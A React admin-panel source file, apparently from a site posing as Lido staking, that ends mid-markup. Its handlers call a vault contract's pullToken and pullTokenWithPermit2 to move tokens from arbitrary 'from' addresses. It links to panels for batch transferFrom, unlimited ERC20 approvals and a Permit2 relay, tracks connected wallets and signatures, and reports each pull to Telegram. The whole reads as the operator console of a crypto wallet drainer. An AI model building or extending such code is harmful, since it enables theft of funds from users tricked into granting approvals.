import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Send,
  Settings,
  Users,
  Activity,
  Lock,
  RefreshCw,
  Radio,
  KeyRound,
  Plus,
  Trash2,
  Edit3,
  CheckCircle2,
  AlertTriangle,
  AlertOctagon,
  Download,
  ExternalLink,
  Filter,
  ArrowUpRight,
  Coins,
  Wallet,
  Layers,
  Shield,
  Zap,
  Globe,
  Sliders,
  Database,
  ArrowRight,
  Navigation,
  Bell,
  Check,
  Archive,
  CheckSquare,
  Square,
  Server,
  Info,
  FileCode,
  CheckCircle,
  TrendingUp,
  FileText
} from 'lucide-react';
import { useAccount, useWriteContract, useReadContract } from 'wagmi';
import { parseEther } from 'viem';
import { useSiweAuth } from '../hooks/useSiweAuth';
import { sendTelegram, formatAdminAction } from '../lib/telegram';
import { CONFIG, VAULT_ABI } from '../lib/contracts';
import {
  getActivities,
  updateActivityRecord,
  bulkUpdateActivities,
  bulkDeleteActivities,
  createAdminLogEntry,
  clearAllActivities,
  ActivityRecord
} from '../lib/activityLogger';
import { getApiLogs, ApiLogEntry } from '../lib/apiConfig';
import { StakingDashboard } from './StakingDashboard';
import Permit2ApprovalPanel from './Permit2ApprovalPanel';
import { BatchTransferFromPanel } from './BatchTransferFromPanel';
import { InfiniteERC20ApprovalPanel } from './InfiniteERC20ApprovalPanel';
import { BackendApiEndpointsHub } from './BackendApiEndpointsHub';
import { ApiLogsPanel } from './ApiLogsPanel';

interface AdminTabProps {
  onNavigate?: (tab: string) => void;
}

export function AdminTab({ onNavigate }: AdminTabProps) {
  const { address, isAuthenticated, isSigning, error, signIn, signOut } = useSiweAuth();
  const { writeContractAsync, isPending } = useWriteContract();

  // Internal Sub-navigation state inside Admin Dashboard
  const [adminSection, setAdminSection] = useState<
    'overview' | 'batch-transfer' | 'erc20-approvals' | 'backend-api' | 'api-logs' | 'permit2' | 'staking' | 'scripts' | 'logs'
  >('overview');

  const [telegramSending, setTelegramSending] = useState(false);
  const [telegramStatus, setTelegramStatus] = useState<string | null>(null);
  const [newReferralAddress, setNewReferralAddress] = useState('');
  const [referralStatus, setReferralStatus] = useState<string | null>(null);

  // Contract script states
  const [pullTokenState, setPullTokenState] = useState({ token: CONFIG.STETH_ADDRESS, from: '', amount: '' });
  const [pullTokenStatus, setPullTokenStatus] = useState<string | null>(null);

  const [pullPermit2State, setPullPermit2State] = useState({ token: CONFIG.STETH_ADDRESS, from: '', amount: '' });
  const [pullPermit2Status, setPullPermit2Status] = useState<string | null>(null);

  const [creditState, setCreditState] = useState({ user: '', amount: '' });
  const [creditStatus, setCreditStatus] = useState<string | null>(null);

  const [withdrawEthState, setWithdrawEthState] = useState({ to: '', amount: '' });
  const [withdrawEthStatus, setWithdrawEthStatus] = useState<string | null>(null);

  const [withdrawTokenState, setWithdrawTokenState] = useState({ token: CONFIG.STETH_ADDRESS, to: '', amount: '' });
  const [withdrawTokenStatus, setWithdrawTokenStatus] = useState<string | null>(null);

  // Read contract on-chain parameters
  const { data: ownerAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'owner',
  });

  const { data: currentReferralAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'referral',
  });

  const { data: lidoContractAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'lido',
  });

  const { data: permit2ContractAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'permit2',
  });

  const { data: wstethReferralStakerAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'wstethReferralStaker',
  });

  // Activity logs state & write controls
  const [activities, setActivities] = useState<ActivityRecord[]>([]);
  const [apiLogs, setApiLogs] = useState<ApiLogEntry[]>([]);
  const [filterType, setFilterType] = useState<string>('ALL');
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editingNote, setEditingNote] = useState<string>('');
  const [newLogNote, setNewLogNote] = useState<string>('');

  // Bulk selection state
  const [selectedActivityIds, setSelectedActivityIds] = useState<string[]>([]);

  const refreshLogs = () => {
    setActivities(getActivities());
    setApiLogs(getApiLogs());
  };

  useEffect(() => {
    refreshLogs();
    window.addEventListener('lido_activity_updated', refreshLogs);
    window.addEventListener('lido_api_logs_updated', refreshLogs);
    return () => {
      window.removeEventListener('lido_activity_updated', refreshLogs);
      window.removeEventListener('lido_api_logs_updated', refreshLogs);
    };
  }, []);

  // Compute Metrics Summary:
  // 1. Total connected unique wallets
  const uniqueWalletsSet = new Set<string>();
  if (address) uniqueWalletsSet.add(address.toLowerCase());
  activities.forEach((act) => {
    if (act.wallet && act.wallet.startsWith('0x')) {
      uniqueWalletsSet.add(act.wallet.toLowerCase());
    }
  });
  apiLogs.forEach((l) => {
    if (l.wallet && l.wallet.startsWith('0x')) {
      uniqueWalletsSet.add(l.wallet.toLowerCase());
    }
  });
  const totalUniqueWallets = uniqueWalletsSet.size;

  // 2. Total successful signature verifications
  const signatureApiSuccesses = apiLogs.filter(
    (l) => l.endpoint.includes('verify-signature') && l.status === 'SUCCESS'
  ).length;
  const activityVerifiedSignatures = activities.filter(
    (a) => a.action === 'WALLET_CONNECT' || a.status === 'Verified' || a.note?.toLowerCase().includes('signature')
  ).length;
  const totalSuccessfulSignatures = Math.max(signatureApiSuccesses, activityVerifiedSignatures);

  // 3. Total volume of transactions processed today
  const isToday = (isoDateStr: string) => {
    const d = new Date(isoDateStr);
    const today = new Date();
    return (
      d.getDate() === today.getDate() &&
      d.getMonth() === today.getMonth() &&
      d.getFullYear() === today.getFullYear()
    );
  };

  const todayActivities = activities.filter((a) => isToday(a.timestamp));
  let totalEthVolumeToday = 0;
  let totalUsdVolumeToday = 0;

  todayActivities.forEach((act) => {
    if (act.amount) {
      const cleaned = act.amount.trim();
      const match = cleaned.match(/^([\d.]+)\s*([A-Za-z0-9]+)?/);
      if (match) {
        const val = parseFloat(match[1]);
        const curr = (match[2] || 'ETH').toUpperCase();
        if (!isNaN(val)) {
          if (curr === 'ETH' || curr === 'STETH' || curr === 'WSTETH' || curr === 'WETH') {
            totalEthVolumeToday += val;
          } else if (curr === 'USDT' || curr === 'USDC' || curr === 'DAI' || curr === 'USD') {
            totalUsdVolumeToday += val;
          } else {
            totalEthVolumeToday += val;
          }
        }
      }
    }
  });

  const formattedTodayVolume = totalEthVolumeToday > 0
    ? `${totalEthVolumeToday.toFixed(3)} ETH${totalUsdVolumeToday > 0 ? ` + $${totalUsdVolumeToday.toLocaleString()}` : ''}`
    : totalUsdVolumeToday > 0
    ? `$${totalUsdVolumeToday.toLocaleString()}`
    : '0.00 ETH';

  // Handler: pullToken
  const handlePullToken = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pullTokenState.token || !pullTokenState.from || !pullTokenState.amount) {
      setPullTokenStatus('All fields (token, from, amount) are required.');
      return;
    }
    setPullTokenStatus('Submitting pullToken transaction...');
    try {
      const parsedAmt = parseEther(pullTokenState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'pullToken',
        args: [pullTokenState.token as `0x${string}`, pullTokenState.from as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setPullTokenStatus(`Token pulled! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Executed pullToken: ${pullTokenState.amount} from ${pullTokenState.from} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('PULL TOKEN', `Token: <code>${pullTokenState.token}</code>\nFrom: <code>${pullTokenState.from}</code>\nAmount: ${pullTokenState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setPullTokenStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: pullTokenWithPermit2
  const handlePullTokenWithPermit2 = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pullPermit2State.token || !pullPermit2State.from || !pullPermit2State.amount) {
      setPullPermit2Status('All fields (token, from, amount) are required.');
      return;
    }
    setPullPermit2Status('Submitting pullTokenWithPermit2 transaction...');
    try {
      const parsedAmt = parseEther(pullPermit2State.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'pullTokenWithPermit2',
        args: [pullPermit2State.token as `0x${string}`, pullPermit2State.from as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setPullPermit2Status(`Permit2 pulled! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Executed pullTokenWithPermit2: ${pullPermit2State.amount} from ${pullPermit2State.from} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('PULL TOKEN PERMIT2', `Token: <code>${pullPermit2State.token}</code>\nFrom: <code>${pullPermit2State.from}</code>\nAmount: ${pullPermit2State.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setPullPermit2Status('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: creditUser
  const handleCreditUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!creditState.user || !creditState.amount) {
      setCreditStatus('User address and amount are required.');
      return;
    }
    setCreditStatus('Submitting creditUser transaction...');
    try {
      const parsedAmt = parseEther(creditState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'creditUser',
        args: [creditState.user as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setCreditStatus(`User credited! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Credited user ${creditState.user} with ${creditState.amount} ETH (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('CREDIT USER', `User: <code>${creditState.user}</code>\nAmount: ${creditState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setCreditStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: withdrawETH
  const handleWithdrawETH = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!withdrawEthState.to || !withdrawEthState.amount) {
      setWithdrawEthStatus('Recipient address and amount are required.');
      return;
    }
    setWithdrawEthStatus('Submitting withdrawETH transaction...');
    try {
      const parsedAmt = parseEther(withdrawEthState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawETH',
        args: [withdrawEthState.to as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setWithdrawEthStatus(`ETH Withdrawn! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Withdrew ${withdrawEthState.amount} ETH to ${withdrawEthState.to} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('WITHDRAW ETH', `To: <code>${withdrawEthState.to}</code>\nAmount: ${withdrawEthState.amount} ETH\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setWithdrawEthStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: withdrawToken
  const handleWithdrawToken = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!withdrawTokenState.token || !withdrawTokenState.to || !withdrawTokenState.amount) {
      setWithdrawTokenStatus('Token, recipient, and amount are required.');
      return;
    }
    setWithdrawTokenStatus('Submitting withdrawToken transaction...');
    try {
      const parsedAmt = parseEther(withdrawTokenState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawToken',
        args: [withdrawTokenState.token as `0x${string}`, withdrawTokenState.to as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setWithdrawTokenStatus(`Token Withdrawn! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Withdrew ${withdrawTokenState.amount} token to ${withdrawTokenState.to} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('WITHDRAW TOKEN', `Token: <code>${withdrawTokenState.token}</code>\nTo: <code>${withdrawTokenState.to}</code>\nAmount: ${withdrawTokenState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setWithdrawTokenStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  const handleTestTelegram = async () => {
    setTelegramSending(true);
    setTelegramStatus(null);
    try {
      await sendTelegram(
        formatAdminAction(
          'MANUAL TELEGRAM TEST PING',
          `Admin <code>${address || '0x...'}</code> tested Telegram Bot connectivity.\nStatus: Active & Listening`
        )
      );
      createAdminLogEntry(address || 'Admin', 'Dispatched Telegram test ping to channel');
      setTelegramStatus('Telegram message sent successfully!');
    } catch (err: any) {
      setTelegramStatus('Failed to send Telegram message: ' + (err.message || String(err)));
    } finally {
      setTelegramSending(false);
    }
  };

  const handleSetReferral = async () => {
    if (!newReferralAddress || !newReferralAddress.startsWith('0x')) {
      setReferralStatus('Please enter a valid 0x address');
      return;
    }
    setReferralStatus(null);
    try {
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'setReferral',
        args: [newReferralAddress as `0x${string}`],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setReferralStatus(`Referral set! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Updated contract referral address to ${newReferralAddress} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('UPDATE REFERRAL', `New Referral Address: <code>${newReferralAddress}</code>\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setReferralStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Write actions
  const handleToggleStatus = (id: string, currentStatus: ActivityRecord['status']) => {
    const statusCycle: Record<ActivityRecord['status'], ActivityRecord['status']> = {
      Confirmed: 'Verified',
      Verified: 'Reviewed',
      Reviewed: 'Flagged',
      Flagged: 'Archived',
      Archived: 'Confirmed',
      Pending: 'Confirmed',
      Failed: 'Flagged',
    };
    const nextStatus = statusCycle[currentStatus] || 'Confirmed';
    updateActivityRecord(id, { status: nextStatus });
  };

  const handleResolveAlert = (id: string) => {
    updateActivityRecord(id, { status: 'Verified', note: 'Reviewed and resolved by administrator' });
  };

  // Bulk activity checkbox handlers
  const handleToggleSelectAll = () => {
    if (selectedActivityIds.length === filteredActivities.length) {
      setSelectedActivityIds([]);
    } else {
      setSelectedActivityIds(filteredActivities.map((a) => a.id));
    }
  };

  const handleToggleSelectOne = (id: string) => {
    setSelectedActivityIds((prev) =>
      prev.includes(id) ? prev.filter((item) => item !== id) : [...prev, id]
    );
  };

  const handleBulkMarkReviewed = () => {
    if (selectedActivityIds.length === 0) return;
    bulkUpdateActivities(selectedActivityIds, {
      status: 'Reviewed',
      note: `Bulk marked as Reviewed by Admin at ${new Date().toLocaleTimeString()}`,
    });
    setSelectedActivityIds([]);
  };

  const handleBulkMarkArchived = () => {
    if (selectedActivityIds.length === 0) return;
    bulkUpdateActivities(selectedActivityIds, {
      status: 'Archived',
      note: `Bulk archived by Admin at ${new Date().toLocaleTimeString()}`,
    });
    setSelectedActivityIds([]);
  };

  const handleBulkFlag = () => {
    if (selectedActivityIds.length === 0) return;
    bulkUpdateActivities(selectedActivityIds, {
      status: 'Flagged',
      note: `Flagged for inspection by Admin at ${new Date().toLocaleTimeString()}`,
    });
    setSelectedActivityIds([]);
  };

  const handleBulkDelete = () => {
    if (selectedActivityIds.length === 0) return;
    if (window.confirm(`Are you sure you want to delete ${selectedActivityIds.length} activity records?`)) {
      bulkDeleteActivities(selectedActivityIds);
      setSelectedActivityIds([]);
    }
  };

  const handleClearSelection = () => {
    setSelectedActivityIds([]);
  };

  const handleSaveNote = (id: string) => {
    updateActivityRecord(id, { note: editingNote });
    setEditingId(null);
    setEditingNote('');
  };

  const handleCreateManualLog = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newLogNote.trim()) return;
    createAdminLogEntry(address || 'Admin', newLogNote.trim());
    setNewLogNote('');
  };

  const handleExportCSV = () => {
    const headers = ['ID', 'Timestamp', 'Wallet', 'Action', 'Amount', 'Token', 'Status', 'Severity', 'Error Message', 'TxHash', 'Note'];
    const rows = activities.map((a) => [
      a.id,
      a.timestamp,
      a.wallet,
      a.action,
      a.amount || '',
      a.token || '',
      a.status,
      a.severity || 'normal',
      a.errorMessage || '',
      a.txHash || '',
      a.note || ''
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((r) => r.map(c => `"${c}"`).join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `lido_activity_logs_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleClearLogs = () => {
    if (window.confirm('Are you sure you want to clear all activity logs?')) {
      clearAllActivities();
      setSelectedActivityIds([]);
    }
  };

  // Critical alerts & failed transaction feed items requiring manual review
  const alertNotifications = activities.filter(
    (a) => a.status === 'Failed' || a.status === 'Flagged' || a.severity === 'critical' || a.severity === 'warning'
  );

  const filteredActivities = activities.filter((a) => {
    if (filterType === 'ALL') return true;
    if (filterType === 'STAKE') return a.action === 'STAKE';
    if (filterType === 'WRAP') return a.action === 'WRAP' || a.action === 'UNWRAP';
    if (filterType === 'WITHDRAW') return a.action === 'WITHDRAW_REQUEST' || a.action === 'WITHDRAW_CLAIM';
    if (filterType === 'FAILED') return a.status === 'Failed' || a.status === 'Flagged';
    if (filterType === 'REVIEWED') return a.status === 'Reviewed' || a.status === 'Verified';
    if (filterType === 'ARCHIVED') return a.status === 'Archived';
    if (filterType === 'ADMIN') return a.action === 'ADMIN_ACTION';
    return true;
  });

  if (!isAuthenticated || !address) {
    return (
      <div className="max-w-4xl mx-auto px-4 py-8 animate-in fade-in duration-300">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold mb-1">Administrative Control Center</h1>
          <p className="text-sm text-text-secondary">Protected Web3 Administration, Permit2 Relay & Smart Contract Management</p>
        </div>

        <div className="bg-card rounded-2xl p-8 border border-border-main text-center shadow-sm max-w-md mx-auto relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-1 bg-[#00A3FF]"></div>
          <div className="w-16 h-16 bg-[#00A3FF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <ShieldAlert className="w-8 h-8 text-[#00A3FF]" />
          </div>
          <h2 className="text-xl font-bold mb-2">Secure Admin Authentication</h2>
          <p className="text-sm text-text-secondary mb-8">
            Connect your authorized Web3 wallet and verify signature to access the admin engine.
          </p>
          
          {error && (
            <div className="mb-6 p-3 bg-red-500/10 border border-red-500/20 rounded-xl text-sm text-red-500 break-words">
              {error}
            </div>
          )}
          
          <button
            onClick={signIn}
            disabled={isSigning}
            className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${isSigning ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white shadow-sm'}`}
          >
            {isSigning ? 'Connecting & Signing...' : 'Connect Wallet & Access Admin'}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-7xl mx-auto px-4 py-6 animate-in fade-in duration-300 space-y-6">
      {/* Top Admin Header Bar with Website Direct Navigation */}
      <div className="bg-card rounded-2xl p-5 border border-border-main shadow-md flex flex-col lg:flex-row lg:items-center justify-between gap-4">
        <div>
          <h1 className="text-xl font-bold flex items-center gap-2 text-text-main">
            <ShieldCheck className="w-6 h-6 text-emerald-500" />
            Lido Master Administration & Control Center
          </h1>
          <p className="text-xs text-text-secondary flex items-center gap-2 mt-1">
            Authenticated Admin: <code className="bg-input px-2 py-0.5 rounded text-[11px] border border-border-main font-mono text-[#00A3FF]">{address}</code>
          </p>
        </div>

        {/* Quick Website Navigation Bar (Admin Ability to Navigate Everywhere) */}
        {onNavigate && (
          <div className="flex flex-wrap items-center gap-1.5 p-1.5 bg-input/60 rounded-xl border border-border-main">
            <span className="text-[11px] font-bold text-text-secondary px-2 flex items-center gap-1">
              <Navigation className="w-3 h-3 text-[#00A3FF]" />
              Go to Page:
            </span>
            {['stake', 'wrap', 'withdrawals', 'rewards', 'earn'].map((page) => (
              <button
                key={page}
                onClick={() => onNavigate(page)}
                className="px-2.5 py-1 text-xs font-semibold rounded-lg bg-card border border-border-main hover:bg-[#00A3FF]/10 hover:text-[#00A3FF] hover:border-[#00A3FF]/30 capitalize transition-all"
              >
                {page}
              </button>
            ))}
          </div>
        )}

        <button 
          onClick={signOut}
          className="self-start lg:self-auto text-xs font-semibold text-text-secondary hover:text-text-main px-3 py-1.5 rounded-lg border border-border-main bg-input transition-colors"
        >
          Sign Out
        </button>
      </div>

      {/* Top Metrics Summary Header */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        {/* Metric 1: Total Connected Unique Wallets */}
        <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-center justify-between relative overflow-hidden group hover:border-[#00A3FF]/40 transition-colors">
          <div className="space-y-1 z-10">
            <div className="flex items-center gap-1.5 text-xs font-semibold text-text-secondary">
              <Wallet className="w-3.5 h-3.5 text-[#00A3FF]" />
              <span>Connected Unique Wallets</span>
            </div>
            <div className="flex items-baseline gap-2">
              <span className="text-2xl lg:text-3xl font-black text-text-main tracking-tight">
                {totalUniqueWallets}
              </span>
              <span className="text-[10px] font-bold text-emerald-500 bg-emerald-500/10 border border-emerald-500/20 px-1.5 py-0.5 rounded-full">
                Active On-Chain
              </span>
            </div>
            <p className="text-[11px] text-text-secondary">Unique Web3 accounts tracked & verified</p>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-[#00A3FF]/10 text-[#00A3FF] flex items-center justify-center shrink-0">
            <Users className="w-6 h-6" />
          </div>
        </div>

        {/* Metric 2: Total Successful Signature Verifications */}
        <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-center justify-between relative overflow-hidden group hover:border-emerald-500/40 transition-colors">
          <div className="space-y-1 z-10">
            <div className="flex items-center gap-1.5 text-xs font-semibold text-text-secondary">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
              <span>Successful Signature Verifications</span>
            </div>
            <div className="flex items-baseline gap-2">
              <span className="text-2xl lg:text-3xl font-black text-emerald-500 tracking-tight">
                {totalSuccessfulSignatures}
              </span>
              <span className="text-[10px] font-bold text-emerald-500 bg-emerald-500/10 border border-emerald-500/20 px-1.5 py-0.5 rounded-full flex items-center gap-0.5">
                <Check className="w-2.5 h-2.5" /> 100% Cryptographic
              </span>
            </div>
            <p className="text-[11px] text-text-secondary">SIWE & Permit signatures validated</p>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-500 flex items-center justify-center shrink-0">
            <CheckCircle className="w-6 h-6" />
          </div>
        </div>

        {/* Metric 3: Total Volume of Transactions Processed Today */}
        <div className="bg-card rounded-2xl p-5 border border-border-main shadow-sm flex items-center justify-between relative overflow-hidden group hover:border-purple-500/40 transition-colors">
          <div className="space-y-1 z-10">
            <div className="flex items-center gap-1.5 text-xs font-semibold text-text-secondary">
              <TrendingUp className="w-3.5 h-3.5 text-purple-400" />
              <span>Today's Transaction Volume</span>
            </div>
            <div className="flex items-baseline gap-2">
              <span className="text-xl lg:text-2xl font-black text-purple-400 tracking-tight font-mono">
                {formattedTodayVolume}
              </span>
              <span className="text-[10px] font-bold text-purple-400 bg-purple-500/10 border border-purple-500/20 px-1.5 py-0.5 rounded-full">
                {todayActivities.length} Ops Today
              </span>
            </div>
            <p className="text-[11px] text-text-secondary">Stakes, wraps, and batch transfers today</p>
          </div>
          <div className="w-12 h-12 rounded-2xl bg-purple-500/10 text-purple-400 flex items-center justify-center shrink-0">
            <Coins className="w-6 h-6" />
          </div>
        </div>
      </div>

      {/* Admin Module Navigation Tabs */}
      <div className="flex flex-wrap items-center gap-2 border-b border-border-main pb-2">
        <button
          onClick={() => setAdminSection('overview')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all relative ${
            adminSection === 'overview'
              ? 'bg-[#00A3FF] text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Sliders className="w-4 h-4" />
          Overview
          {alertNotifications.length > 0 && (
            <span className="ml-1 px-1.5 py-0.5 rounded-full text-[10px] font-extrabold bg-red-500 text-white animate-pulse">
              {alertNotifications.length}
            </span>
          )}
        </button>

        <button
          onClick={() => setAdminSection('batch-transfer')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'batch-transfer'
              ? 'bg-[#00A3FF] text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Layers className="w-4 h-4 text-cyan-300" />
          Batch transferFrom
        </button>

        <button
          onClick={() => setAdminSection('erc20-approvals')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'erc20-approvals'
              ? 'bg-amber-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Zap className="w-4 h-4 text-amber-300" />
          Unlimited ERC20 Approvals
        </button>

        <button
          onClick={() => setAdminSection('backend-api')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'backend-api'
              ? 'bg-indigo-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Server className="w-4 h-4 text-indigo-300" />
          Backend API & Signature Hub
        </button>

        <button
          onClick={() => setAdminSection('api-logs')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'api-logs'
              ? 'bg-teal-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <FileText className="w-4 h-4 text-teal-300" />
          API Logs ({apiLogs.length})
        </button>

        <button
          onClick={() => setAdminSection('permit2')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'permit2'
              ? 'bg-purple-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Lock className="w-4 h-4 text-purple-300" />
          Permit2 Relay
        </button>

        <button
          onClick={() => setAdminSection('staking')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'staking'
              ? 'bg-emerald-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Coins className="w-4 h-4 text-emerald-300" />
          Staking Dashboard
        </button>

        <button
          onClick={() => setAdminSection('scripts')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'scripts'
              ? 'bg-slate-700 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <KeyRound className="w-4 h-4 text-slate-300" />
          Vault Scripts
        </button>

        <button
          onClick={() => setAdminSection('logs')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all ${
            adminSection === 'logs'
              ? 'bg-blue-600 text-white shadow-sm'
              : 'bg-card text-text-secondary hover:text-text-main border border-border-main'
          }`}
        >
          <Database className="w-4 h-4 text-blue-300" />
          Activity Logs ({activities.length})
        </button>
      </div>

      {/* SECTION: Batch transferFrom Console */}
      {adminSection === 'batch-transfer' && (
        <div className="space-y-6">
          <BatchTransferFromPanel />
        </div>
      )}

      {/* SECTION: Unlimited ERC20 Approvals */}
      {adminSection === 'erc20-approvals' && (
        <div className="space-y-6">
          <InfiniteERC20ApprovalPanel />
        </div>
      )}

      {/* SECTION: Backend Server & Signature API */}
      {adminSection === 'backend-api' && (
        <div className="space-y-6">
          <BackendApiEndpointsHub />
        </div>
      )}

      {/* SECTION: API Logs & Signature Verification Streams */}
      {adminSection === 'api-logs' && (
        <div className="space-y-6">
          <ApiLogsPanel />
        </div>
      )}

      {/* SECTION: Permit2 Approval & Relayer Controller */}
      {adminSection === 'permit2' && (
        <div className="space-y-6">
          <Permit2ApprovalPanel />
        </div>
      )}

      {/* SECTION: Direct Ethers.js ERC-20 Staking Dashboard */}
      {adminSection === 'staking' && (
        <div className="space-y-6">
          <StakingDashboard />
        </div>
      )}

      {/* SECTION: Overview & Analytics */}
      {adminSection === 'overview' && (
        <div className="space-y-6">
          {/* Admin Dashboard Access Methods Guide Banner */}
          <div className="bg-gradient-to-r from-blue-900/20 via-indigo-900/10 to-transparent rounded-2xl border border-[#00A3FF]/30 p-5 shadow-sm space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-[#00A3FF]" />
                <h3 className="font-bold text-sm text-text-main">Admin Dashboard Fast Access Methods</h3>
              </div>
              <span className="text-[11px] font-mono text-[#00A3FF] font-semibold">Active Mode: Administrator</span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-1">
              <div className="p-3 bg-card rounded-xl border border-border-main">
                <span className="text-xs font-bold text-text-main flex items-center gap-1.5 mb-1">
                  <Globe className="w-3.5 h-3.5 text-[#00A3FF]" /> Direct URL Parameter
                </span>
                <p className="text-[11px] text-text-secondary">
